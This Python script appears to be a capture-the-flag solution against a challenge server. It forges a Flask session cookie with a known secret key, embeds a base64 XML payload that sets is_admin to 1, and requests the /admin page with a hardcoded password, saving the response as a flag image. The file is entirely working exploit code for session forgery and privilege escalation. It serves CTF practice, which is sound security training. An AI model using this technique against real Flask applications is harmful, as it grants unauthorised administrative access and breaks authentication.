import base64

from flask.sessions import SecureCookieSessionInterface
import requests


class App:
    url = 'http://challenges2.hexionteam.com:2002'
    admin_pass = 'gLTAqe12Z3OufWG7'
    secret_key = 'gLTAqe12Z3OufWG7'


app = App()
builder = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = builder.dumps({
    'lxml': base64.b64encode(b'<root><data><is_admin>1</is_admin></data></root>'),
})
r = requests.get(
    f'{app.url}/admin',
    params={'password': app.admin_pass},
    headers={'Cookie': f'session={cookie}'},
)
print(r.status_code)
for header in r.headers.items():
    print(header)
with open('flag.png', 'wb') as fp:
    fp.write(r.content)
